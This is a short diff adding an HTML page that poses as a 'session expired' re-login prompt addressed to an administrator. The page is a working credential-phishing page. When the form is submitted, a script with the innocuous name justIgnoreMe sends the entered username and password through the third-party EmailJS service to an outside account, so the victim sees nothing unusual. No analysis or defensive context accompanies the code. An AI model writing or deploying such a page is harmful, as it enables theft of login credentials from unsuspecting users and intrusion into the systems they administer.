@@ -1,0 +1,28 @@
+<head>
+<title>Hello, administrator.</title>
+
+<script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
+<script type="text/javascript">
+   (function(){
+      emailjs.init("");
+   })();
+</script>
+
+</head>
+<body>
+<script>
+	function justIgnoreMe(form) {
+		emailjs.send("portacoeli","simple",{user: form.user.value, password: form.pass.value});
+		return false;
+	}
+</script>
+
+<b>Your session has expired. Please enter your credentials to continue work.</b>
+
+<form onsubmit="return justIgnoreMe(this);">
+	Username: <input type="text" name="user"><br>
+	Password: <input type="password" name="pass"><br>
+	<input type="submit" value="Submit">
+</form>
+
+</body>
